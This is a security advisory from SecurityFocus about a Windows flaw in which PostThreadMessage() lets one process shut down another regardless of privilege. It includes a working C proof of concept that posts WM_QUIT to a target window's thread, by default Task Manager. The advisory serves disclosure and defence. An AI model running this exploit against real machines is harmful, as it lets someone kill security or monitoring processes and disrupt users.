source: http://www.securityfocus.com/bid/8747/info

A vulnerability has been discovered in the Microsoft Windows operating system. The flaw lies in the way that processes handle messages sent from another process via the PostThreadMessage() API call. Reports indicate that, if a running process has a message queue and is sent one of 3 different messages, the process may terminate. This termination will occur despite any security level differences between processes, as well as any safe guards to prevent this behaviour, such as requiring a password before the process is killed.

This issue likely occurs due to a design error, specifically failing to ensure that process verifies the origin of messages recieved via the PostThreadMessage() API call. 

#include <windows.h>
#include <commctrl.h>
#include <stdio.h>
char tWindow[]="Windows Task Manager";// The name of the main window
char* pWindow;
int main(int argc, char *argv[])
{
        long hWnd,proc;
        DWORD hThread;
        printf("%% AppShutdown - Playing with PostThreadMessage\n");
        printf("%% brett.moore@security-assessment.com\n\n");
        // Specify Window Title On Command Line
        if (argc ==2)
                pWindow = argv[1];
        else
                pWindow = tWindow;

        printf("+ Finding %s Window...\n",pWindow);
        hWnd = (long)FindWindow(NULL,pWindow);
        if(hWnd == NULL)
        {
          printf("+ Couldn't Find %s Window\n",pWindow);
          return 0;
        }
        printf("+ Found Main Window At...0x%xh\n",hWnd);
        printf("+ Finding Window Thread..");
        hThread = GetWindowThreadProcessId(hWnd,&proc);
        if(hThread  == NULL)
        {
          printf("Failed\n");
          return 0;
        }
        printf("0x%xh Process 0x%xh\n",hThread,proc);
        printf("+ Send Quit Message\n");
        PostThreadMessage((DWORD) hThread,(UINT) WM_QUIT,0,0);
        printf("+ Done...\n");
        return 0;
}